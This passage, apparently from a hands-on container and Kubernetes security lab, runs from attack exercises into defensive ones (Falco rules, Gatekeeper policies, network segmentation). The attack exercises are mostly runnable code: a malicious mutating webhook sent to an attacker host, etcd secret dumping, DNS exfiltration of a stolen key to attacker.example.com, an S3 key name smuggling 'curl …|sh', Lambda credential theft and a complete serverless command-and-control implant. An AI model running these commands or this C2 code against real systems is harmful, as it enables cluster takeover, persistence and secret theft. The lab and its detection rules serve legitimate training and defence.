# Register a mutating webhook that injects a sidecar into all new pods
# In a real attack, the webhook URL would point to attacker infrastructure
# Here we demonstrate the registration pattern

cat > /tmp/webhook.json << 'EOF'
{
  "apiVersion": "admissionregistration.k8s.io/v1",
  "kind": "MutatingWebhookConfiguration",
  "metadata": {
    "name": "pod-injector"
  },
  "webhooks": [{
    "name": "inject.monitoring.io",
    "clientConfig": {
      "url": "https://attacker-webhook.example.com/mutate"
    },
    "rules": [{
      "operations": ["CREATE"],
      "apiGroups": [""],
      "apiVersions": ["v1"],
      "resources": ["pods"]
    }],
    "admissionReviewVersions": ["v1"],
    "sideEffects": "None",
    "failurePolicy": "Ignore",
    "namespaceSelector": {
      "matchExpressions": [{
        "key": "kubernetes.io/metadata.name",
        "operator": "NotIn",
        "values": ["kube-system"]
      }]
    }
  }]
}
EOF

curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations" \
  -X POST -H "Content-Type: application/json" \
  -d @/tmp/webhook.json

echo "[*] Mutating webhook registered — will inject sidecar into all new pods"
```

#### Step 3 — Detect persistence mechanisms

```bash
# Find all CronJobs in system namespaces
kubectl get cronjobs -n kube-system -o json | \
  jq -r '.items[] | "\(.metadata.name) | Schedule: \(.spec.schedule) | Image: \(.spec.jobTemplate.spec.template.spec.containers[0].image)"'

# Find all DaemonSets in system namespaces
kubectl get daemonsets -n kube-system -o json | \
  jq -r '.items[] | "\(.metadata.name) | Image: \(.spec.template.spec.containers[0].image) | Privileged: \(.spec.template.spec.containers[0].securityContext.privileged // false)"'

# Audit mutating webhooks
kubectl get mutatingwebhookconfigurations -o json | \
  jq -r '.items[] | "\(.metadata.name) | URL: \(.webhooks[0].clientConfig.url // .webhooks[0].clientConfig.service.name) | Failure: \(.webhooks[0].failurePolicy)"'

# Check audit log for persistence indicators
kubectl exec -n kube-system k3s-server -- cat /var/log/kube-audit.log | \
  jq -r 'select(.objectRef.resource | test("cronjobs|daemonsets|mutatingwebhookconfigurations")) |
  select(.verb | test("create|update|patch")) |
  [.requestReceivedTimestamp, .user.username, .verb, .objectRef.resource, .objectRef.name] | @tsv' 2>/dev/null | sort
```

**Expected output.** CronJob and DaemonSet created in kube-system. Mutating webhook registered. Detection queries identify all persistence mechanisms.

---

### Exercise 8: etcd Secret Extraction and Cluster State Manipulation

**Objective.** Directly access etcd to extract all Kubernetes secrets and demonstrate the impact of unencrypted secret storage.

#### Step 1 — Access etcd from control plane node

```bash
# Exec into the K3s server (which runs etcd embedded)
docker exec -it k3s-server sh

# K3s uses embedded etcd (or sqlite by default — check mode)
# For K3s with embedded etcd:
ETCDCTL_API=3 /var/lib/rancher/k3s/data/current/bin/etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/rancher/k3s/server/tls/etcd/server-ca.crt \
  --cert=/var/lib/rancher/k3s/server/tls/etcd/server-client.crt \
  --key=/var/lib/rancher/k3s/server/tls/etcd/server-client.key \
  get /registry/secrets --prefix --keys-only 2>/dev/null | head -20

# If K3s uses SQLite (default for single-node):
sqlite3 /var/lib/rancher/k3s/server/db/state.db \
  "SELECT name FROM kine WHERE name LIKE '%secrets%' LIMIT 20;" 2>/dev/null
```

#### Step 2 — Dump specific secrets from etcd

```bash
# Extract all secrets (raw protobuf)
ETCDCTL_API=3 /var/lib/rancher/k3s/data/current/bin/etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/rancher/k3s/server/tls/etcd/server-ca.crt \
  --cert=/var/lib/rancher/k3s/server/tls/etcd/server-client.crt \
  --key=/var/lib/rancher/k3s/server/tls/etcd/server-client.key \
  get /registry/secrets/production/db-credentials 2>/dev/null | strings | grep -E "(password|username|connection)"
```

#### Step 3 — Verify encryption at rest status

```bash
# Check if EncryptionConfiguration is active
cat /var/lib/rancher/k3s/server/cred/encryption-config.json 2>/dev/null || \
  echo "[!] No encryption config found — secrets stored in PLAINTEXT"

# Verify via API
kubectl get secrets -A -o json | jq '[.items[].type] | group_by(.) | map({type: .[0], count: length})'
```

**Expected output.** Secrets readable as plaintext (base64-decoded) from etcd/sqlite. Missing encryption configuration confirmed.

---

### Exercise 9: Lateral Movement — DNS Enumeration and Network Scanning

**Objective.** Map the Kubernetes internal network, discover services, and pivot between namespaces using DNS and network scanning.

#### Step 1 — DNS-based service discovery

```bash
# From the attacker pod
kubectl exec -it -n attacker attacker -- bash

# Enumerate services via DNS SRV records
nslookup -type=srv _http._tcp.production.svc.cluster.local 2>/dev/null
nslookup -type=srv _https._tcp.production.svc.cluster.local 2>/dev/null

# Brute-force service names
for svc in kubernetes dashboard prometheus grafana elasticsearch redis postgres mysql \
           mongodb rabbitmq kafka zookeeper consul vault argocd jenkins gitlab \
           vuln-app web api backend frontend; do
    for ns in default production kube-system monitoring logging; do
        result=$(nslookup $svc.$ns.svc.cluster.local 2>/dev/null | grep -c "Address:")
        if [ "$result" -gt 1 ]; then
            echo "[+] $svc.$ns.svc.cluster.local — FOUND"
        fi
    done
done
```

#### Step 2 — Pod network scanning

```bash
# Discover pod CIDR
ip route | grep -v default
# Typically 10.42.0.0/16 for K3s

# Scan local pod subnet
for ip in $(seq 1 30); do
    for port in 8080 80 443 3306 5432 6379 27017 9200 2379; do
        timeout 0.3 bash -c "echo >/dev/tcp/10.42.0.$ip/$port" 2>/dev/null && \
            echo "[+] 10.42.0.$ip:$port OPEN"
    done
done
```

#### Step 3 — DNS exfiltration PoC

```bash
# Encode and exfiltrate data via DNS queries
# In a real attack, the DNS server would be attacker-controlled
SECRET_DATA=$(curl -s http://vuln-app.production.svc.cluster.local:8080/api/exec \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /mnt/secrets/stripe_key"}' | jq -r '.stdout' | base64 | tr -d '\n')

# Split into DNS-safe chunks (63 chars max per label)
echo "$SECRET_DATA" | fold -w 60 | while read chunk; do
    dig +short "$chunk.exfil.attacker.example.com" A 2>/dev/null
done

echo "[*] Data exfiltrated via DNS queries (check DNS logs for detection)"
```

**Expected output.** Service discovery reveals `vuln-app.production` and `postgres.production`. Network scan identifies open ports. DNS exfiltration demonstrates the data leak path.

---

### Exercise 10: Serverless Attack Patterns — Lambda Event Injection and Persistence

**Objective.** Exploit serverless functions via event injection, demonstrate `/tmp` persistence, execution role abuse, and serverless C2 patterns.

#### Step 1 — Event injection via S3 key

```bash
# Upload a file with a malicious S3 key name (command injection)
export AWS_ENDPOINT_URL=http://172.20.0.30:4566
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1

# Malicious key name that would trigger command injection in a vulnerable handler
aws --endpoint-url=$AWS_ENDPOINT_URL s3 cp /dev/null \
  "s3://upload-bucket/;curl attacker.example.com/shell.sh|sh;.txt"

echo "[*] Malicious S3 key uploaded — would trigger RCE in vulnerable Lambda handler"
```

#### Step 2 — Lambda environment variable extraction

```bash
# Invoke the function to extract its environment variables
aws --endpoint-url=$AWS_ENDPOINT_URL lambda invoke \
  --function-name vulnerable-processor \
  --payload '{"action": "env"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/lambda-env.json

cat /tmp/lambda-env.json | jq '.env | to_entries[] | select(.key | test("DB_|API_|SECRET|KEY|PASSWORD")) | {key: .key, value: .value}'
```

**Expected output:**
```json
{"key": "DB_HOST", "value": "prod-db.internal"}
{"key": "DB_PASSWORD", "value": "ProdPassword456!"}
{"key": "API_KEY", "value": "sk-live-abcdef123456"}
```

#### Step 3 — Lambda /tmp persistence

```bash
# First invocation: write persistent payload to /tmp
aws --endpoint-url=$AWS_ENDPOINT_URL lambda invoke \
  --function-name vulnerable-processor \
  --payload '{"action": "persist"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/persist1.json

cat /tmp/persist1.json | jq .
# {"persisted": true, "tmp_exists": true}

# Second invocation (warm container): check if /tmp survives
aws --endpoint-url=$AWS_ENDPOINT_URL lambda invoke \
  --function-name vulnerable-processor \
  --payload '{"action": "exec", "cmd": "ls -la /tmp/beacon && cat /tmp/beacon"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/persist2.json

cat /tmp/persist2.json | jq .
# If warm container reuse: beacon file persists
```

#### Step 4 — Execution role abuse

```bash
# The Lambda has AdministratorAccess — demonstrate credential theft
aws --endpoint-url=$AWS_ENDPOINT_URL lambda invoke \
  --function-name vulnerable-processor \
  --payload '{"action": "exec", "cmd": "env | grep AWS"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/creds.json

cat /tmp/creds.json | jq -r '.stdout'

# Use stolen credentials to access other AWS services
aws --endpoint-url=$AWS_ENDPOINT_URL lambda invoke \
  --function-name vulnerable-processor \
  --payload '{"action": "exec", "cmd": "aws --endpoint-url=http://172.20.0.30:4566 s3 ls s3://sensitive-data/ --recursive"}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/s3-enum.json

cat /tmp/s3-enum.json | jq -r '.stdout'
```

#### Step 5 — Serverless C2 framework PoC

Save as `serverless_c2.py`:

```python
#!/usr/bin/env python3
"""Serverless C2 PoC using Lambda + DynamoDB for command-and-control.
Educational demonstration of how serverless infrastructure can be abused."""

import json
import time
import uuid
import subprocess

ENDPOINT = "http://172.20.0.30:4566"
REGION = "us-east-1"
TABLE = "c2-tasking"


def aws_cmd(service: str, action: str, **kwargs) -> dict:
    """Execute an AWS CLI command via LocalStack."""
    cmd = ["aws", "--endpoint-url", ENDPOINT, "--region", REGION, service, action]
    for key, val in kwargs.items():
        cmd.extend([f"--{key.replace('_', '-')}", val])
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except json.JSONDecodeError:
        return {"raw": result.stdout, "error": result.stderr}


class C2Server:
    """Serverless C2 server — uses DynamoDB for tasking."""

    def __init__(self):
        self.implants = {}

    def register_implant(self, implant_id: str, metadata: dict):
        aws_cmd("dynamodb", "put-item",
                table_name=TABLE,
                item=json.dumps({
                    "implant_id": {"S": implant_id},
                    "status": {"S": "registered"},
                    "metadata": {"S": json.dumps(metadata)},
                    "pending_cmd": {"S": ""},
                    "last_seen": {"S": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())},
                }))
        print(f"[C2] Implant registered: {implant_id}")

    def task_implant(self, implant_id: str, command: str):
        aws_cmd("dynamodb", "update-item",
                table_name=TABLE,
                key=json.dumps({"implant_id": {"S": implant_id}}),
                update_expression="SET pending_cmd = :cmd",
                expression_attribute_values=json.dumps({":cmd": {"S": command}}))
        print(f"[C2] Task sent to {implant_id}: {command}")

    def get_results(self, implant_id: str) -> dict:
        result = aws_cmd("dynamodb", "get-item",
                         table_name=TABLE,
                         key=json.dumps({"implant_id": {"S": implant_id}}))
        item = result.get("Item", {})
        return {
            "status": item.get("status", {}).get("S"),
            "last_seen": item.get("last_seen", {}).get("S"),
            "output": item.get("cmd_output", {}).get("S", ""),
        }


class C2Implant:
    """Simulated implant — checks DynamoDB for tasking."""

    def __init__(self, implant_id: str):
        self.implant_id = implant_id

    def checkin(self):
        result = aws_cmd("dynamodb", "get-item",
                         table_name=TABLE,
                         key=json.dumps({"implant_id": {"S": self.implant_id}}))
        item = result.get("Item", {})
        pending = item.get("pending_cmd", {}).get("S", "")

        if pending:
            print(f"[Implant] Executing: {pending}")
            cmd_result = subprocess.run(pending, shell=True, capture_output=True, text=True, timeout=10)
            output = cmd_result.stdout[:1024]

            aws_cmd("dynamodb", "update-item",
                    table_name=TABLE,
                    key=json.dumps({"implant_id": {"S": self.implant_id}}),
                    update_expression="SET cmd_output = :out, pending_cmd = :empty, last_seen = :ts, #st = :status",
                    expression_attribute_names=json.dumps({"#st": "status"}),
                    expression_attribute_values=json.dumps({
                        ":out": {"S": output},
                        ":empty": {"S": ""},
                        ":ts": {"S": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())},
                        ":status": {"S": "active"},
                    }))
            return output
        return None


def demo():
    """Demonstrate serverless C2 lifecycle."""
    print("=" * 60)
    print("  SERVERLESS C2 PoC DEMONSTRATION")
    print("=" * 60)

    server = C2Server()
    implant_id = f"impl-{uuid.uuid4().hex[:8]}"

    print("\n[Phase 1] Register implant")
    server.register_implant(implant_id, {
        "hostname": "victim-host",
        "os": "linux",
        "user": "www-data",
    })

    print("\n[Phase 2] Send tasking")
    server.task_implant(implant_id, "id && hostname && uname -a")

    print("\n[Phase 3] Implant checks in and executes")
    implant = C2Implant(implant_id)
    output = implant.checkin()
    print(f"[Implant] Output:\n{output}")

    print("\n[Phase 4] Server retrieves results")
    results = server.get_results(implant_id)
    print(f"[C2] Status: {results['status']}")
    print(f"[C2] Last seen: {results['last_seen']}")
    print(f"[C2] Output: {results['output']}")

    print("\n[*] Detection indicators:")
    print("  - Unusual DynamoDB access patterns from Lambda functions")
    print("  - API Gateway endpoints receiving POST requests from unknown IPs")
    print("  - Lambda invocations with suspicious command execution")
    print("  - CloudTrail events for DynamoDB PutItem/GetItem from Lambda roles")


if __name__ == "__main__":
    demo()
```

**Verification.** Run against LocalStack. Confirm environment variables extracted, /tmp persistence demonstrated, C2 lifecycle completes with tasking and result retrieval.

---

### Exercise 11: Image Supply Chain Attack — Typosquatting and Layer Poisoning

**Objective.** Demonstrate supply chain attack vectors against container images.

#### Step 1 — Typosquatting detection

```bash
# Common typosquat patterns for popular images
OFFICIAL_IMAGES=("nginx" "python" "node" "redis" "postgres" "mysql" "alpine" "ubuntu")

echo "[*] Checking for common typosquat variants..."
for img in "${OFFICIAL_IMAGES[@]}"; do
    # Generate typosquat candidates
    echo "  $img → ${img}s, ${img}x, ${img/a/e}, n${img}, ${img}1"
done

# Check image authenticity
docker inspect --format='{{index .RepoDigests 0}}' nginx:latest 2>/dev/null
# Digest-pinned references prevent tag mutation attacks
```

#### Step 2 — Malicious layer injection detection

```bash
# Inspect image layers for unexpected additions
docker exec -it docker-lab sh

docker pull nginx:1.27-alpine
docker save nginx:1.27-alpine -o /tmp/nginx.tar
mkdir -p /tmp/nginx-layers && cd /tmp/nginx-layers
tar xf /tmp/nginx.tar

# List all layers
cat manifest.json | jq '.[0].Layers'

# Examine each layer for suspicious files
for layer in $(cat manifest.json | jq -r '.[0].Layers[]'); do
    echo "=== Layer: $layer ==="
    tar tf "$layer" 2>/dev/null | head -20
    # Look for suspicious files
    tar tf "$layer" 2>/dev/null | grep -E "(\.sh$|\.py$|cron|backdoor|reverse|shell|/tmp/)" || true
done

# Check image history for suspicious commands
docker history --no-trunc nginx:1.27-alpine | head -20
```

#### Step 3 — Dockerfile security scanner

Save as `dockerfile_scanner.sh`:

```bash
#!/bin/bash
# Dockerfile security scanner — identifies common security issues

DOCKERFILE="${1:-Dockerfile}"

if [ ! -f "$DOCKERFILE" ]; then
    echo "Usage: $0 <Dockerfile>"
    exit 1
fi

echo "========================================"
echo "  DOCKERFILE SECURITY SCAN: $DOCKERFILE"
echo "========================================"

FINDINGS=0

# Check for unpinned base image (no digest)
if grep -q "^FROM.*:latest" "$DOCKERFILE" || grep -qP "^FROM\s+\S+\s*$" "$DOCKERFILE"; then
    echo "[HIGH] Unpinned base image — use @sha256: digest"
    FINDINGS=$((FINDINGS + 1))
fi

if ! grep -q "@sha256:" "$DOCKERFILE"; then
    echo "[MEDIUM] No digest-pinned images — vulnerable to tag mutation"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for running as root
if ! grep -q "^USER " "$DOCKERFILE"; then
    echo "[HIGH] No USER directive — container runs as root"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for curl|sh patterns
if grep -qE "curl.*\|\s*sh|wget.*\|\s*sh|curl.*\|\s*bash" "$DOCKERFILE"; then
    echo "[CRITICAL] Pipe-to-shell pattern detected — supply chain risk"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for ADD instead of COPY
if grep -q "^ADD " "$DOCKERFILE"; then
    echo "[MEDIUM] ADD used instead of COPY — ADD can unpack tarballs and fetch URLs"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for sensitive files
if grep -qE "COPY.*(\.env|\.key|\.pem|credentials|secret|password)" "$DOCKERFILE"; then
    echo "[CRITICAL] Sensitive file copied into image"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for multi-stage build
if [ "$(grep -c "^FROM " "$DOCKERFILE")" -lt 2 ]; then
    echo "[MEDIUM] No multi-stage build — larger attack surface"
    FINDINGS=$((FINDINGS + 1))
fi

# Check for HEALTHCHECK
if ! grep -q "^HEALTHCHECK " "$DOCKERFILE"; then
    echo "[LOW] No HEALTHCHECK defined"
fi

echo ""
echo "  Total findings: $FINDINGS"
echo "========================================"
```

**Verification.** Run layer inspection on a pulled image. Confirm scanner identifies common Dockerfile security issues.

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 12: Runtime Detection with Falco

**Objective.** Deploy Falco for real-time container runtime detection and write custom rules for escape indicators.

#### Step 1 — Deploy Falco via Helm on K3s

```bash
export KUBECONFIG="$(pwd)/kubeconfig/kubeconfig.yaml"

# Install Falco with Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set driver.kind=modern_ebpf \
  --set collectors.containerd.enabled=true \
  --set collectors.containerd.socket=/run/k3s/containerd/containerd.sock

# Verify Falco is running
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
```

#### Step 2 — Custom Falco rules for container escape detection

Save as `custom-falco-rules.yaml`:

```yaml
customRules:
  container-escape-rules.yaml: |-
    # Rule 1: Docker socket access from container
    - rule: Container Accessing Docker Socket
      desc: Detect container process communicating with Docker socket
      condition: >
        evt.type in (connect, sendto) and
        container.id != host and
        fd.name = /var/run/docker.sock
      output: >
        Container accessing Docker socket
        (user=%user.name command=%proc.cmdline container=%container.name
         image=%container.image.repository socket=%fd.name
         pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: CRITICAL
      tags: [container, docker, escape, T1611]

    # Rule 2: nsenter targeting PID 1 (host namespace entry)
    - rule: Nsenter Host Namespace Entry
      desc: Detect nsenter with target PID 1 indicating container escape
      condition: >
        spawned_process and
        proc.name = nsenter and
        proc.args contains "-t 1"
      output: >
        nsenter used to enter host namespaces from container
        (user=%user.name command=%proc.cmdline container=%container.name
         image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: CRITICAL
      tags: [container, escape, nsenter, T1611]

    # Rule 3: Cgroup release_agent write (CVE-2022-0492)
    - rule: Cgroup Release Agent Write
      desc: Detect write to cgroup release_agent file (container escape)
      condition: >
        open_write and
        container.id != host and
        fd.name endswith "/release_agent"
      output: >
        Cgroup release_agent write detected (CVE-2022-0492 escape)
        (user=%user.name command=%proc.cmdline file=%fd.name
         container=%container.name image=%container.image.repository)
      priority: CRITICAL
      tags: [container, escape, cgroup, CVE-2022-0492, T1611]

    # Rule 4: core_pattern modification
    - rule: Core Pattern Modified
      desc: Detect modification of kernel core_pattern (container escape vector)
      condition: >
        open_write and
        fd.name = /proc/sys/kernel/core_pattern
      output: >
        core_pattern modified (potential container escape)
        (user=%user.name command=%proc.cmdline container=%container.name
         image=%container.image.repository)
      priority: CRITICAL
      tags: [container, escape, core_pattern, T1611]

    # Rule 5: Shell spawned in container
    - rule: Interactive Shell in Container
      desc: Detect interactive shell execution in a running container
      condition: >
        spawned_process and
        container and
        proc.name in (bash, sh, zsh, dash, ash, ksh, csh, tcsh, fish) and
        proc.tty != 0 and
        not proc.pname in (crond, supervisord, entrypoint.sh, containerd-shim)
      output: >
        Interactive shell spawned in container
        (user=%user.name shell=%proc.name parent=%proc.pname
         command=%proc.cmdline container=%container.name
         image=%container.image.repository pod=%k8s.pod.name)
      priority: WARNING
      tags: [container, shell, T1059]

    # Rule 6: Network recon tools in container
    - rule: Network Reconnaissance Tool in Container
      desc: Detect network scanning/recon tools launched in containers
      condition: >
        spawned_process and
        container and
        proc.name in (nmap, nc, ncat, netcat, socat, masscan, tcpdump,
                       tshark, dig, nslookup, host)
      output: >
        Network recon tool launched in container
        (user=%user.name tool=%proc.name command=%proc.cmdline
         container=%container.name image=%container.image.repository
         pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: WARNING
      tags: [container, network, discovery, T1046]

    # Rule 7: Sensitive file access in container
    - rule: Sensitive File Read in Container
      desc: Detect reading of credential and config files
      condition: >
        open_read and
        container and
        (fd.name in (/etc/shadow, /etc/sudoers, /etc/pam.conf,
                      /etc/kubernetes/admin.conf) or
         fd.name startswith /var/run/secrets/kubernetes.io or
         fd.name startswith /var/lib/kubelet/pki)
      output: >
        Sensitive file read in container
        (user=%user.name file=%fd.name command=%proc.cmdline
         container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: WARNING
      tags: [container, credential_access, T1552]

    # Rule 8: Crypto miner detection
    - rule: Crypto Mining Process
      desc: Detect known crypto mining processes or arguments
      condition: >
        spawned_process and
        container and
        (proc.name in (xmrig, minerd, cpuminer, ethminer, ccminer,
                        t-rex, phoenixminer, nbminer, lolminer) or
         proc.cmdline contains "stratum+tcp://" or
         proc.cmdline contains "stratum+ssl://" or
         proc.cmdline contains "--donate-level" or
         proc.cmdline contains "pool.minergate" or
         proc.cmdline contains "mining.pool")
      output: >
        Crypto miner detected in container
        (user=%user.name command=%proc.cmdline container=%container.name
         image=%container.image.repository pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, cryptomining, T1496]

    # Rule 9: Binary executed from memory (fileless malware)
    - rule: Memory-Only Binary Execution
      desc: Detect execution of binaries from memory file descriptors
      condition: >
        spawned_process and
        container and
        (proc.exe contains "memfd:" or
         proc.is_exe_from_memfd = true)
      output: >
        Binary executed from memory (fileless execution)
        (user=%user.name command=%proc.cmdline exe=%proc.exe
         container=%container.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, defense_evasion, T1620]

    # Rule 10: Kubernetes SA token access by unexpected process
    - rule: ServiceAccount Token Access
      desc: Detect non-standard processes reading K8s SA tokens
      condition: >
        open_read and
        container and
        fd.name = /var/run/secrets/kubernetes.io/serviceaccount/token and
        not proc.name in (curl, wget, kubectl, kubelet, kube-proxy)
      output: >
        SA token read by unexpected process
        (user=%user.name process=%proc.name command=%proc.cmdline
         container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: NOTICE
      tags: [container, credential_access, T1528]
```

Apply custom rules:

```bash
helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --values custom-falco-rules.yaml \
  --reuse-values
```

#### Step 3 — Trigger Falco alerts

```bash
# Trigger shell-in-container alert
kubectl exec -it -n attacker attacker -- bash -c "echo test"

# Trigger network tool alert
kubectl exec -n attacker attacker -- nmap -sT -p 80,443 10.42.0.0/24

# Trigger SA token read alert
kubectl exec -n attacker attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check Falco alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 | grep -E "Warning|Critical|Notice"
```

**Verification.** Falco pods running and generating alerts for each triggered rule. Confirm alert format includes container name, pod name, namespace, and MITRE ATT&CK tags.

---

### Exercise 13: Admission Control — OPA/Gatekeeper and Kyverno Policies

**Objective.** Deploy admission controllers that enforce security policies, blocking privileged containers, requiring non-root users, and enforcing image digest pinning.

#### Step 1 — Install Gatekeeper

```bash
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/v3.16.0/deploy/gatekeeper.yaml

# Wait for Gatekeeper pods
kubectl wait --for=condition=ready pod -l control-plane=controller-manager -n gatekeeper-system --timeout=120s
```

#### Step 2 — Create Gatekeeper policies

```bash
# Policy 1: Block privileged containers
kubectl apply -f - <<'EOF'
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8spspprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sPSPPrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8spspprivilegedcontainer
        violation[{"msg": msg}] {
          c := input.review.object.spec.containers[_]
          c.securityContext.privileged == true
          msg := sprintf("Privileged container blocked: %v", [c.name])
        }
        violation[{"msg": msg}] {
          c := input.review.object.spec.initContainers[_]
          c.securityContext.privileged == true
          msg := sprintf("Privileged init container blocked: %v", [c.name])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: block-privileged-containers
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces: ["kube-system", "gatekeeper-system", "falco"]
EOF

# Policy 2: Require non-root user
kubectl apply -f - <<'EOF'
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8spspmustrunasnonroot
spec:
  crd:
    spec:
      names:
        kind: K8sPSPMustRunAsNonRoot
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8spspmustrunasnonroot
        violation[{"msg": msg}] {
          c := input.review.object.spec.containers[_]
          not c.securityContext.runAsNonRoot
          not c.securityContext.runAsUser > 0
          msg := sprintf("Container %v must set runAsNonRoot: true", [c.name])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPMustRunAsNonRoot
metadata:
  name: require-run-as-nonroot
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces: ["kube-system", "gatekeeper-system", "falco"]
EOF

# Policy 3: Block Docker socket mounts
kubectl apply -f - <<'EOF'
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockdockersock
spec:
  crd:
    spec:
      names:
        kind: K8sBlockDockerSock
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockdockersock
        violation[{"msg": msg}] {
          volume := input.review.object.spec.volumes[_]
          volume.hostPath.path == "/var/run/docker.sock"
          msg := sprintf("Volume %v mounts Docker socket", [volume.name])
        }
        violation[{"msg": msg}] {
          c := input.review.object.spec.containers[_]
          mount := c.volumeMounts[_]
          mount.mountPath == "/var/run/docker.sock"
          msg := sprintf("Container %v mounts Docker socket", [c.name])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockDockerSock
metadata:
  name: block-docker-socket
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
EOF
```

#### Step 3 — Test policy enforcement

```bash
# Attempt to create a privileged pod (should be DENIED)
kubectl apply -f - <<'EOF' 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: production
spec:
  containers:
    - name: evil
      image: alpine:3.19
      securityContext:
        privileged: true
      command: ["sleep", "infinity"]
EOF
# Expected: admission webhook denied the request

# Attempt to create a pod without runAsNonRoot (should be DENIED)
kubectl apply -f - <<'EOF' 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: root-pod
  namespace: production
spec:
  containers:
    - name: root
      image: alpine:3.19
      command: ["sleep", "infinity"]
EOF
# Expected: denied — must set runAsNonRoot

# Create a compliant pod (should SUCCEED)
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: safe-pod
  namespace: production
spec:
  containers:
    - name: safe
      image: alpine:3.19
      command: ["sleep", "infinity"]
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
EOF

kubectl get pod safe-pod -n production
```

**Expected output.** Privileged and root-running pods are denied by Gatekeeper. Compliant pod is accepted and starts successfully.

---

### Exercise 14: Network Segmentation with NetworkPolicy

**Objective.** Implement default-deny network policies and test pod-to-pod isolation.

#### Step 1 — Apply default-deny

```bash
# Default deny all ingress and egress in production namespace
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
---
# Allow DNS egress (required for service discovery)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
---
# Allow vuln-app to reach postgres (micro-segmentation)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: postgres
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: vuln-app
      ports:
        - protocol: TCP
          port: 5432
---
# Block cross-namespace access to production
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-cross-namespace
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector: {}
EOF
```

#### Step 2 — Test network segmentation

```bash
# From attacker namespace: try to reach vuln-app (should be BLOCKED)
kubectl exec -n attacker attacker -- curl -s --connect-timeout 3 http://vuln-app.production.svc.cluster.local:8080/healthz
# Expected: timeout (cross-namespace blocked)

# From production namespace: try to reach external (should be BLOCKED except DNS)
kubectl exec -n production vuln-app-xxxx -- curl -s --connect-timeout 3 http://httpbin.org/ip
# Expected: timeout (egress blocked)

# Verify DNS still works
kubectl exec -n production vuln-app-xxxx -- nslookup kubernetes.default.svc.cluster.local
# Expected: resolves (DNS allowed)
```

**Verification.** Cross-namespace traffic blocked. Egress blocked except DNS. Intra-namespace app-to-db traffic allowed.

---

### Exercise 15: Pod Security Standards Enforcement

**Objective.** Apply the PSS Restricted profile to a namespace and verify enforcement.

```bash
